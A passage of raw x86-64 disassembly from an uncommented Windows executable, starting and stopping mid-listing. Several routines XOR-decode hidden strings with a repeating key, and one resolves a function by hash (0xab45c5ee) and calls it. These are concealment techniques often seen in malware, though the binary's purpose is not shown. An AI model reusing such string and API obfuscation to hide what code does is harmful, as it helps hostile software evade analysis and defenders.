   140005df6:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005dfb:	48 83 7d 88 0f       	cmpq   $0xf,-0x78(%rbp)
   140005e00:	48 0f 47 4c 24 70    	cmova  0x70(%rsp),%rcx
   140005e06:	33 d2                	xor    %edx,%edx
   140005e08:	49 8b c2             	mov    %r10,%rax
   140005e0b:	48 f7 f3             	div    %rbx
   140005e0e:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140005e13:	43 32 04 10          	xor    (%r8,%r10,1),%al
   140005e17:	42 88 04 11          	mov    %al,(%rcx,%r10,1)
   140005e1b:	49 ff c2             	inc    %r10
   140005e1e:	4c 3b 15 43 a7 01 00 	cmp    0x1a743(%rip),%r10        # 0x140020568
   140005e25:	72 bc                	jb     0x140005de3
   140005e27:	48 8d 15 a2 9c 01 00 	lea    0x19ca2(%rip),%rdx        # 0x14001fad0
   140005e2e:	48 83 3d b2 9c 01 00 	cmpq   $0xf,0x19cb2(%rip)        # 0x14001fae8
   140005e35:	0f 
   140005e36:	48 0f 47 15 92 9c 01 	cmova  0x19c92(%rip),%rdx        # 0x14001fad0
   140005e3d:	00 
   140005e3e:	44 8b cf             	mov    %edi,%r9d
   140005e41:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005e46:	e8 75 e7 ff ff       	call   0x1400045c0
   140005e4b:	e9 54 01 00 00       	jmp    0x140005fa4
   140005e50:	48 8b 15 31 a7 01 00 	mov    0x1a731(%rip),%rdx        # 0x140020588
   140005e57:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005e5c:	e8 ff 05 00 00       	call   0x140006460
   140005e61:	4c 8d 0d 78 8a 00 00 	lea    0x8a78(%rip),%r9        # 0x14000e8e0
   140005e68:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140005e6f:	00 
   140005e70:	48 ff c3             	inc    %rbx
   140005e73:	41 80 3c 19 00       	cmpb   $0x0,(%r9,%rbx,1)
   140005e78:	75 f6                	jne    0x140005e70
   140005e7a:	4c 8b d6             	mov    %rsi,%r10
   140005e7d:	48 39 35 04 a7 01 00 	cmp    %rsi,0x1a704(%rip)        # 0x140020588
   140005e84:	76 4e                	jbe    0x140005ed4
   140005e86:	4c 8d 1d eb a6 01 00 	lea    0x1a6eb(%rip),%r11        # 0x140020578
   140005e8d:	0f 1f 00             	nopl   (%rax)
   140005e90:	4d 8b c3             	mov    %r11,%r8
   140005e93:	48 83 3d f5 a6 01 00 	cmpq   $0xf,0x1a6f5(%rip)        # 0x140020590
   140005e9a:	0f 
   140005e9b:	4c 0f 47 05 d5 a6 01 	cmova  0x1a6d5(%rip),%r8        # 0x140020578
   140005ea2:	00 
   140005ea3:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005ea8:	48 83 7d 88 0f       	cmpq   $0xf,-0x78(%rbp)
   140005ead:	48 0f 47 4c 24 70    	cmova  0x70(%rsp),%rcx
   140005eb3:	33 d2                	xor    %edx,%edx
   140005eb5:	49 8b c2             	mov    %r10,%rax
   140005eb8:	48 f7 f3             	div    %rbx
   140005ebb:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140005ec0:	43 32 04 10          	xor    (%r8,%r10,1),%al
   140005ec4:	41 88 04 0a          	mov    %al,(%r10,%rcx,1)
   140005ec8:	49 ff c2             	inc    %r10
   140005ecb:	4c 3b 15 b6 a6 01 00 	cmp    0x1a6b6(%rip),%r10        # 0x140020588
   140005ed2:	72 bc                	jb     0x140005e90
   140005ed4:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005ed9:	e8 b2 f2 ff ff       	call   0x140005190
   140005ede:	48 8b cf             	mov    %rdi,%rcx
   140005ee1:	ff 55 e0             	call   *-0x20(%rbp)
   140005ee4:	49 8b cc             	mov    %r12,%rcx
   140005ee7:	ff 15 53 51 00 00    	call   *0x5153(%rip)        # 0x14000b040
   140005eed:	44 8b fe             	mov    %esi,%r15d
   140005ef0:	e9 af 00 00 00       	jmp    0x140005fa4
   140005ef5:	ff 15 1d 51 00 00    	call   *0x511d(%rip)        # 0x14000b018
   140005efb:	8b f8                	mov    %eax,%edi
   140005efd:	48 8b 15 44 a6 01 00 	mov    0x1a644(%rip),%rdx        # 0x140020548
   140005f04:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005f09:	e8 52 05 00 00       	call   0x140006460
   140005f0e:	4c 8d 0d cb 89 00 00 	lea    0x89cb(%rip),%r9        # 0x14000e8e0
   140005f15:	48 ff c3             	inc    %rbx
   140005f18:	41 80 3c 19 00       	cmpb   $0x0,(%r9,%rbx,1)
   140005f1d:	75 f6                	jne    0x140005f15
   140005f1f:	4c 8b d6             	mov    %rsi,%r10
   140005f22:	48 39 35 1f a6 01 00 	cmp    %rsi,0x1a61f(%rip)        # 0x140020548
   140005f29:	76 4b                	jbe    0x140005f76
   140005f2b:	4c 8d 1d 06 a6 01 00 	lea    0x1a606(%rip),%r11        # 0x140020538
   140005f32:	4d 8b c3             	mov    %r11,%r8
   140005f35:	48 83 3d 13 a6 01 00 	cmpq   $0xf,0x1a613(%rip)        # 0x140020550
   140005f3c:	0f 
   140005f3d:	4c 0f 47 05 f3 a5 01 	cmova  0x1a5f3(%rip),%r8        # 0x140020538
   140005f44:	00 
   140005f45:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005f4a:	48 83 7d 88 0f       	cmpq   $0xf,-0x78(%rbp)
   140005f4f:	48 0f 47 4c 24 70    	cmova  0x70(%rsp),%rcx
   140005f55:	33 d2                	xor    %edx,%edx
   140005f57:	49 8b c2             	mov    %r10,%rax
   140005f5a:	48 f7 f3             	div    %rbx
   140005f5d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140005f62:	43 32 04 10          	xor    (%r8,%r10,1),%al
   140005f66:	42 88 04 11          	mov    %al,(%rcx,%r10,1)
   140005f6a:	49 ff c2             	inc    %r10
   140005f6d:	4c 3b 15 d4 a5 01 00 	cmp    0x1a5d4(%rip),%r10        # 0x140020548
   140005f74:	72 bc                	jb     0x140005f32
   140005f76:	48 8d 15 53 9b 01 00 	lea    0x19b53(%rip),%rdx        # 0x14001fad0
   140005f7d:	48 83 3d 63 9b 01 00 	cmpq   $0xf,0x19b63(%rip)        # 0x14001fae8
   140005f84:	0f 
   140005f85:	44 8b cf             	mov    %edi,%r9d
   140005f88:	48 0f 47 15 40 9b 01 	cmova  0x19b40(%rip),%rdx        # 0x14001fad0
   140005f8f:	00 
   140005f90:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005f95:	e8 26 e6 ff ff       	call   0x1400045c0
   140005f9a:	49 8b cc             	mov    %r12,%rcx
   140005f9d:	ff 15 9d 50 00 00    	call   *0x509d(%rip)        # 0x14000b040
   140005fa3:	90                   	nop
   140005fa4:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   140005fa8:	48 83 fa 0f          	cmp    $0xf,%rdx
   140005fac:	76 43                	jbe    0x140005ff1
   140005fae:	48 ff c2             	inc    %rdx
   140005fb1:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   140005fb5:	48 8b c1             	mov    %rcx,%rax
   140005fb8:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140005fbf:	72 2b                	jb     0x140005fec
   140005fc1:	48 83 c2 27          	add    $0x27,%rdx
   140005fc5:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140005fc9:	48 2b c1             	sub    %rcx,%rax
   140005fcc:	48 83 e8 08          	sub    $0x8,%rax
   140005fd0:	48 83 f8 1f          	cmp    $0x1f,%rax
   140005fd4:	76 16                	jbe    0x140005fec
   140005fd6:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140005fdb:	45 33 c9             	xor    %r9d,%r9d
   140005fde:	45 33 c0             	xor    %r8d,%r8d
   140005fe1:	33 d2                	xor    %edx,%edx
   140005fe3:	33 c9                	xor    %ecx,%ecx
   140005fe5:	ff 15 65 53 00 00    	call   *0x5365(%rip)        # 0x14000b350
   140005feb:	cc                   	int3
   140005fec:	e8 ab 2a 00 00       	call   0x140008a9c
   140005ff1:	66 0f 6f 05 f7 8a 00 	movdqa 0x8af7(%rip),%xmm0        # 0x14000eaf0
   140005ff8:	00 
   140005ff9:	f3 0f 7f 45 08       	movdqu %xmm0,0x8(%rbp)
   140005ffe:	c6 45 f8 00          	movb   $0x0,-0x8(%rbp)
   140006002:	48 8b 55 30          	mov    0x30(%rbp),%rdx
   140006006:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000600a:	76 43                	jbe    0x14000604f
   14000600c:	48 ff c2             	inc    %rdx
   14000600f:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
   140006013:	48 8b c1             	mov    %rcx,%rax
   140006016:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000601d:	72 2b                	jb     0x14000604a
   14000601f:	48 83 c2 27          	add    $0x27,%rdx
   140006023:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140006027:	48 2b c1             	sub    %rcx,%rax
   14000602a:	48 83 e8 08          	sub    $0x8,%rax
   14000602e:	48 83 f8 1f          	cmp    $0x1f,%rax
   140006032:	76 16                	jbe    0x14000604a
   140006034:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140006039:	45 33 c9             	xor    %r9d,%r9d
   14000603c:	45 33 c0             	xor    %r8d,%r8d
   14000603f:	33 d2                	xor    %edx,%edx
   140006041:	33 c9                	xor    %ecx,%ecx
   140006043:	ff 15 07 53 00 00    	call   *0x5307(%rip)        # 0x14000b350
   140006049:	cc                   	int3
   14000604a:	e8 4d 2a 00 00       	call   0x140008a9c
   14000604f:	41 8b c7             	mov    %r15d,%eax
   140006052:	e9 85 01 00 00       	jmp    0x1400061dc
   140006057:	ff 15 bb 4f 00 00    	call   *0x4fbb(%rip)        # 0x14000b018
   14000605d:	8b f8                	mov    %eax,%edi
   14000605f:	48 8b 15 82 a5 01 00 	mov    0x1a582(%rip),%rdx        # 0x1400205e8
   140006066:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000606b:	e8 f0 03 00 00       	call   0x140006460
   140006070:	4c 8d 35 71 88 00 00 	lea    0x8871(%rip),%r14        # 0x14000e8e8
   140006077:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000607e:	00 00 
   140006080:	48 ff c3             	inc    %rbx
   140006083:	41 80 3c 1e 00       	cmpb   $0x0,(%r14,%rbx,1)
   140006088:	75 f6                	jne    0x140006080
   14000608a:	48 83 3d 56 a5 01 00 	cmpq   $0x0,0x1a556(%rip)        # 0x1400205e8
   140006091:	00 
   140006092:	76 4f                	jbe    0x1400060e3
   140006094:	4c 8d 0d 3d a5 01 00 	lea    0x1a53d(%rip),%r9        # 0x1400205d8
   14000609b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400060a0:	4d 8b c1             	mov    %r9,%r8
   1400060a3:	48 83 3d 45 a5 01 00 	cmpq   $0xf,0x1a545(%rip)        # 0x1400205f0
   1400060aa:	0f 
   1400060ab:	4c 0f 47 05 25 a5 01 	cmova  0x1a525(%rip),%r8        # 0x1400205d8
   1400060b2:	00 
   1400060b3:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400060b8:	48 83 7d 88 0f       	cmpq   $0xf,-0x78(%rbp)
   1400060bd:	48 0f 47 4c 24 70    	cmova  0x70(%rsp),%rcx
   1400060c3:	33 d2                	xor    %edx,%edx
   1400060c5:	48 8b c6             	mov    %rsi,%rax
   1400060c8:	48 f7 f3             	div    %rbx
   1400060cb:	42 0f b6 04 32       	movzbl (%rdx,%r14,1),%eax
   1400060d0:	41 32 04 30          	xor    (%r8,%rsi,1),%al
   1400060d4:	88 04 31             	mov    %al,(%rcx,%rsi,1)
   1400060d7:	48 ff c6             	inc    %rsi
   1400060da:	48 3b 35 07 a5 01 00 	cmp    0x1a507(%rip),%rsi        # 0x1400205e8
   1400060e1:	72 bd                	jb     0x1400060a0
   1400060e3:	48 8d 15 e6 99 01 00 	lea    0x199e6(%rip),%rdx        # 0x14001fad0
   1400060ea:	48 83 3d f6 99 01 00 	cmpq   $0xf,0x199f6(%rip)        # 0x14001fae8
   1400060f1:	0f 
   1400060f2:	48 0f 47 15 d6 99 01 	cmova  0x199d6(%rip),%rdx        # 0x14001fad0
   1400060f9:	00 
   1400060fa:	44 8b cf             	mov    %edi,%r9d
   1400060fd:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140006102:	e8 b9 e4 ff ff       	call   0x1400045c0
   140006107:	49 8b cc             	mov    %r12,%rcx
   14000610a:	ff 15 30 4f 00 00    	call   *0x4f30(%rip)        # 0x14000b040
   140006110:	e9 c2 00 00 00       	jmp    0x1400061d7
   140006115:	ba ee c5 45 ab       	mov    $0xab45c5ee,%edx
   14000611a:	49 8b ce             	mov    %r14,%rcx
   14000611d:	e8 ce e3 ff ff       	call   0x1400044f0
   140006122:	48 85 c0             	test   %rax,%rax
   140006125:	74 05                	je     0x14000612c
   140006127:	48 8b cf             	mov    %rdi,%rcx
   14000612a:	ff d0                	call   *%rax
   14000612c:	ff 15 e6 4e 00 00    	call   *0x4ee6(%rip)        # 0x14000b018
   140006132:	8b f8                	mov    %eax,%edi
   140006134:	48 8b 15 2d a3 01 00 	mov    0x1a32d(%rip),%rdx        # 0x140020468
   14000613b:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140006140:	e8 1b 03 00 00       	call   0x140006460
   140006145:	4c 8d 0d 94 87 00 00 	lea    0x8794(%rip),%r9        # 0x14000e8e0
   14000614c:	0f 1f 40 00          	nopl   0x0(%rax)
   140006150:	48 ff c3             	inc    %rbx
   140006153:	41 80 3c 19 00       	cmpb   $0x0,(%r9,%rbx,1)
   140006158:	75 f6                	jne    0x140006150
   14000615a:	48 83 3d 06 a3 01 00 	cmpq   $0x0,0x1a306(%rip)        # 0x140020468
   140006161:	00 
   140006162:	76 4f                	jbe    0x1400061b3
   140006164:	4c 8d 15 ed a2 01 00 	lea    0x1a2ed(%rip),%r10        # 0x140020458
   14000616b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006170:	4d 8b c2             	mov    %r10,%r8
   140006173:	48 83 3d f5 a2 01 00 	cmpq   $0xf,0x1a2f5(%rip)        # 0x140020470
   14000617a:	0f 
   14000617b:	4c 0f 47 05 d5 a2 01 	cmova  0x1a2d5(%rip),%r8        # 0x140020458
   140006182:	00 
   140006183:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140006188:	48 83 7d 88 0f       	cmpq   $0xf,-0x78(%rbp)
   14000618d:	48 0f 47 4c 24 70    	cmova  0x70(%rsp),%rcx
   140006193:	33 d2                	xor    %edx,%edx
   140006195:	48 8b c6             	mov    %rsi,%rax
   140006198:	48 f7 f3             	div    %rbx
   14000619b:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400061a0:	41 32 04 30          	xor    (%r8,%rsi,1),%al
   1400061a4:	88 04 31             	mov    %al,(%rcx,%rsi,1)
   1400061a7:	48 ff c6             	inc    %rsi
   1400061aa:	48 3b 35 b7 a2 01 00 	cmp    0x1a2b7(%rip),%rsi        # 0x140020468
   1400061b1:	72 bd                	jb     0x140006170
   1400061b3:	48 8d 15 16 99 01 00 	lea    0x19916(%rip),%rdx        # 0x14001fad0
   1400061ba:	48 83 3d 26 99 01 00 	cmpq   $0xf,0x19926(%rip)        # 0x14001fae8
   1400061c1:	0f 
   1400061c2:	44 8b cf             	mov    %edi,%r9d
   1400061c5:	48 0f 47 15 03 99 01 	cmova  0x19903(%rip),%rdx        # 0x14001fad0
   1400061cc:	00 
   1400061cd:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400061d2:	e8 e9 e3 ff ff       	call   0x1400045c0
   1400061d7:	b8 01 00 00 00       	mov    $0x1,%eax
   1400061dc:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   1400061e0:	48 33 cc             	xor    %rsp,%rcx
   1400061e3:	e8 18 26 00 00       	call   0x140008800
   1400061e8:	4c 8d 9c 24 40 01 00 	lea    0x140(%rsp),%r11
   1400061ef:	00 
   1400061f0:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1400061f4:	49 8b 73 38          	mov    0x38(%r11),%rsi
   1400061f8:	49 8b 7b 40          	mov    0x40(%r11),%rdi
   1400061fc:	49 8b e3             	mov    %r11,%rsp
   1400061ff:	41 5f                	pop    %r15
   140006201:	41 5e                	pop    %r14
   140006203:	41 5d                	pop    %r13
   140006205:	41 5c                	pop    %r12
   140006207:	5d                   	pop    %rbp
   140006208:	c3                   	ret
   140006209:	cc                   	int3
   14000620a:	cc                   	int3
   14000620b:	cc                   	int3
   14000620c:	cc                   	int3
   14000620d:	cc                   	int3
   14000620e:	cc                   	int3
   14000620f:	cc                   	int3
   140006210:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140006215:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000621a:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000621f:	56                   	push   %rsi
   140006220:	57                   	push   %rdi
   140006221:	41 56                	push   %r14
   140006223:	48 83 ec 30          	sub    $0x30,%rsp
   140006227:	48 8b f1             	mov    %rcx,%rsi
   14000622a:	33 db                	xor    %ebx,%ebx
   14000622c:	89 5c 24 58          	mov    %ebx,0x58(%rsp)
   140006230:	48 8b 01             	mov    (%rcx),%rax
   140006233:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140006237:	48 8b 7c 0a 28       	mov    0x28(%rdx,%rcx,1),%rdi
   14000623c:	48 85 ff             	test   %rdi,%rdi
   14000623f:	7e 0c                	jle    0x14000624d
   140006241:	48 83 ff 02          	cmp    $0x2,%rdi
   140006245:	7e 06                	jle    0x14000624d
   140006247:	48 83 c7 fe          	add    $0xfffffffffffffffe,%rdi
   14000624b:	eb 02                	jmp    0x14000624f
   14000624d:	33 ff                	xor    %edi,%edi
   14000624f:	4c 8b f6             	mov    %rsi,%r14
   140006252:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140006257:	48 8b 4c 0a 48       	mov    0x48(%rdx,%rcx,1),%rcx
   14000625c:	48 85 c9             	test   %rcx,%rcx
   14000625f:	74 07                	je     0x140006268
   140006261:	48 8b 01             	mov    (%rcx),%rax
   140006264:	ff 50 08             	call   *0x8(%rax)
   140006267:	90                   	nop
   140006268:	48 8b 06             	mov    (%rsi),%rax
   14000626b:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000626f:	48 03 ce             	add    %rsi,%rcx
   140006272:	ff 15 20 4f 00 00    	call   *0x4f20(%rip)        # 0x14000b198
   140006278:	84 c0                	test   %al,%al
   14000627a:	75 06                	jne    0x140006282
   14000627c:	88 44 24 28          	mov    %al,0x28(%rsp)
   140006280:	eb 39                	jmp    0x1400062bb
   140006282:	48 8b 06             	mov    (%rsi),%rax
   140006285:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140006289:	48 8b 4c 31 50       	mov    0x50(%rcx,%rsi,1),%rcx
   14000628e:	48 85 c9             	test   %rcx,%rcx
   140006291:	74 21                	je     0x1400062b4
   140006293:	48 3b ce             	cmp    %rsi,%rcx
   140006296:	74 1c                	je     0x1400062b4
   140006298:	ff 15 32 4e 00 00    	call   *0x4e32(%rip)        # 0x14000b0d0
   14000629e:	48 8b 06             	mov    (%rsi),%rax
   1400062a1:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400062a5:	48 03 ce             	add    %rsi,%rcx
   1400062a8:	ff 15 ea 4e 00 00    	call   *0x4eea(%rip)        # 0x14000b198
   1400062ae:	88 44 24 28          	mov    %al,0x28(%rsp)
   1400062b2:	eb 07                	jmp    0x1400062bb
   1400062b4:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   1400062b9:	b0 01                	mov    $0x1,%al
   1400062bb:	84 c0                	test   %al,%al
   1400062bd:	75 0a                	jne    0x1400062c9
   1400062bf:	bb 04 00 00 00       	mov    $0x4,%ebx
   1400062c4:	e9 b6 00 00 00       	jmp    0x14000637f
   1400062c9:	48 8b 16             	mov    (%rsi),%rdx
   1400062cc:	48 63 42 04          	movslq 0x4(%rdx),%rax
   1400062d0:	8b 4c 30 18          	mov    0x18(%rax,%rsi,1),%ecx
   1400062d4:	81 e1 c0 01 00 00    	and    $0x1c0,%ecx
   1400062da:	83 f9 40             	cmp    $0x40,%ecx
   1400062dd:	74 2a                	je     0x140006309
   1400062df:	90                   	nop
   1400062e0:	48 85 ff             	test   %rdi,%rdi
   1400062e3:	7e 21                	jle    0x140006306
   1400062e5:	48 8b 06             	mov    (%rsi),%rax
   1400062e8:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400062ec:	0f b6 54 31 58       	movzbl 0x58(%rcx,%rsi,1),%edx
   1400062f1:	48 8b 4c 31 48       	mov    0x48(%rcx,%rsi,1),%rcx
   1400062f6:	ff 15 fc 4d 00 00    	call   *0x4dfc(%rip)        # 0x14000b0f8
   1400062fc:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400062ff:	74 55                	je     0x140006356
   140006301:	48 ff cf             	dec    %rdi
   140006304:	eb da                	jmp    0x1400062e0
   140006306:	48 8b 16             	mov    (%rsi),%rdx
   140006309:	48 63 4a 04          	movslq 0x4(%rdx),%rcx
   14000630d:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140006313:	48 8d 15 56 86 00 00 	lea    0x8656(%rip),%rdx        # 0x14000e970
   14000631a:	48 8b 4c 31 48       	mov    0x48(%rcx,%rsi,1),%rcx
   14000631f:	ff 15 db 4d 00 00    	call   *0x4ddb(%rip)        # 0x14000b100
   140006325:	48 83 f8 02          	cmp    $0x2,%rax
   140006329:	75 2b                	jne    0x140006356
   14000632b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006330:	48 85 ff             	test   %rdi,%rdi
   140006333:	7e 2a                	jle    0x14000635f
   140006335:	48 8b 06             	mov    (%rsi),%rax
   140006338:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000633c:	0f b6 54 31 58       	movzbl 0x58(%rcx,%rsi,1),%edx
   140006341:	48 8b 4c 31 48       	mov    0x48(%rcx,%rsi,1),%rcx
   140006346:	ff 15 ac 4d 00 00    	call   *0x4dac(%rip)        # 0x14000b0f8
   14000634c:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000634f:	74 05                	je     0x140006356
   140006351:	48 ff cf             	dec    %rdi
   140006354:	eb da                	jmp    0x140006330
   140006356:	bb 04 00 00 00       	mov    $0x4,%ebx
   14000635b:	89 5c 24 58          	mov    %ebx,0x58(%rsp)
   14000635f:	48 8b 06             	mov    (%rsi),%rax
   140006362:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140006366:	48 c7 44 31 28 00 00 	movq   $0x0,0x28(%rcx,%rsi,1)
   14000636d:	00 00 
   14000636f:	eb 0e                	jmp    0x14000637f
   140006371:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140006376:	8b 5c 24 58          	mov    0x58(%rsp),%ebx
   14000637a:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   14000637f:	48 8b 06             	mov    (%rsi),%rax
   140006382:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140006386:	48 03 ce             	add    %rsi,%rcx
   140006389:	45 33 c0             	xor    %r8d,%r8d
   14000638c:	8b d3                	mov    %ebx,%edx
   14000638e:	ff 15 54 4d 00 00    	call   *0x4d54(%rip)        # 0x14000b0e8
   140006394:	90                   	nop
   140006395:	ff 15 3d 4e 00 00    	call   *0x4e3d(%rip)        # 0x14000b1d8
   14000639b:	84 c0                	test   %al,%al
   14000639d:	75 0a                	jne    0x1400063a9
   14000639f:	49 8b ce             	mov    %r14,%rcx
   1400063a2:	ff 15 20 4d 00 00    	call   *0x4d20(%rip)        # 0x14000b0c8
   1400063a8:	90                   	nop
   1400063a9:	49 8b 06             	mov    (%r14),%rax
   1400063ac:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400063b0:	4a 8b 4c 31 48       	mov    0x48(%rcx,%r14,1),%rcx
   1400063b5:	48 85 c9             	test   %rcx,%rcx
   1400063b8:	74 07                	je     0x1400063c1
   1400063ba:	48 8b 01             	mov    (%rcx),%rax
   1400063bd:	ff 50 10             	call   *0x10(%rax)
   1400063c0:	90                   	nop
   1400063c1:	48 8b c6             	mov    %rsi,%rax
   1400063c4:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400063c9:	48 83 c4 30          	add    $0x30,%rsp
   1400063cd:	41 5e                	pop    %r14
   1400063cf:	5f                   	pop    %rdi
   1400063d0:	5e                   	pop    %rsi
   1400063d1:	c3                   	ret
   1400063d2:	cc                   	int3
   1400063d3:	cc                   	int3
   1400063d4:	cc                   	int3
   1400063d5:	cc                   	int3
   1400063d6:	cc                   	int3
   1400063d7:	cc                   	int3
   1400063d8:	cc                   	int3
   1400063d9:	cc                   	int3
   1400063da:	cc                   	int3
   1400063db:	cc                   	int3
   1400063dc:	cc                   	int3
   1400063dd:	cc                   	int3
   1400063de:	cc                   	int3
   1400063df:	cc                   	int3
   1400063e0:	40 53                	rex push %rbx
   1400063e2:	48 83 ec 30          	sub    $0x30,%rsp
   1400063e6:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   1400063ea:	48 8b d9             	mov    %rcx,%rbx
   1400063ed:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400063f1:	76 2c                	jbe    0x14000641f
   1400063f3:	48 8b 09             	mov    (%rcx),%rcx
   1400063f6:	48 ff c2             	inc    %rdx
   1400063f9:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140006400:	72 18                	jb     0x14000641a
   140006402:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140006406:	48 83 c2 27          	add    $0x27,%rdx
   14000640a:	48 2b c8             	sub    %rax,%rcx
   14000640d:	48 83 e9 08          	sub    $0x8,%rcx
   140006411:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140006415:	77 21                	ja     0x140006438
   140006417:	48 8b c8             	mov    %rax,%rcx
   14000641a:	e8 7d 26 00 00       	call   0x140008a9c
   14000641f:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
   140006426:	00 
   140006427:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   14000642e:	00 
   14000642f:	c6 03 00             	movb   $0x0,(%rbx)
   140006432:	48 83 c4 30          	add    $0x30,%rsp
   140006436:	5b                   	pop    %rbx
   140006437:	c3                   	ret
   140006438:	45 33 c9             	xor    %r9d,%r9d
   14000643b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140006442:	00 00 
   140006444:	45 33 c0             	xor    %r8d,%r8d
   140006447:	33 d2                	xor    %edx,%edx
   140006449:	33 c9                	xor    %ecx,%ecx
   14000644b:	ff 15 ff 4e 00 00    	call   *0x4eff(%rip)        # 0x14000b350
   140006451:	cc                   	int3
   140006452:	cc                   	int3
   140006453:	cc                   	int3
   140006454:	cc                   	int3
   140006455:	cc                   	int3
   140006456:	cc                   	int3
   140006457:	cc                   	int3
   140006458:	cc                   	int3
   140006459:	cc                   	int3
   14000645a:	cc                   	int3
   14000645b:	cc                   	int3
   14000645c:	cc                   	int3
   14000645d:	cc                   	int3
   14000645e:	cc                   	int3
   14000645f:	cc                   	int3
   140006460:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140006465:	55                   	push   %rbp
   140006466:	56                   	push   %rsi
   140006467:	57                   	push   %rdi
   140006468:	48 83 ec 30          	sub    $0x30,%rsp
   14000646c:	33 ff                	xor    %edi,%edi
   14000646e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140006471:	0f 11 01             	movups %xmm0,(%rcx)
   140006474:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   14000647b:	ff ff 7f 
   14000647e:	48 89 79 10          	mov    %rdi,0x10(%rcx)
   140006482:	48 89 79 18          	mov    %rdi,0x18(%rcx)
   140006486:	48 8b f2             	mov    %rdx,%rsi
   140006489:	48 8b d9             	mov    %rcx,%rbx
   14000648c:	48 3b d5             	cmp    %rbp,%rdx
   14000648f:	0f 87 db 00 00 00    	ja     0x140006570
   140006495:	48 83 fa 0f          	cmp    $0xf,%rdx
   140006499:	77 2a                	ja     0x1400064c5
   14000649b:	48 89 51 10          	mov    %rdx,0x10(%rcx)
   14000649f:	4c 8b c2             	mov    %rdx,%r8
   1400064a2:	33 d2                	xor    %edx,%edx
   1400064a4:	48 c7 41 18 0f 00 00 	movq   $0xf,0x18(%rcx)
   1400064ab:	00 
   1400064ac:	e8 d4 32 00 00       	call   0x140009785
   1400064b1:	48 8b c3             	mov    %rbx,%rax
   1400064b4:	40 88 3c 1e          	mov    %dil,(%rsi,%rbx,1)
   1400064b8:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400064bd:	48 83 c4 30          	add    $0x30,%rsp
   1400064c1:	5f                   	pop    %rdi
   1400064c2:	5e                   	pop    %rsi
   1400064c3:	5d                   	pop    %rbp
   1400064c4:	c3                   	ret
   1400064c5:	48 8b c6             	mov    %rsi,%rax
   1400064c8:	48 83 c8 0f          	or     $0xf,%rax
   1400064cc:	48 3b c5             	cmp    %rbp,%rax
   1400064cf:	76 31                	jbe    0x140006502
   1400064d1:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   1400064d8:	00 00 80 
   1400064db:	48 83 c0 27          	add    $0x27,%rax
   1400064df:	48 8b c8             	mov    %rax,%rcx
   1400064e2:	e8 39 23 00 00       	call   0x140008820
   1400064e7:	48 85 c0             	test   %rax,%rax
   1400064ea:	75 42                	jne    0x14000652e
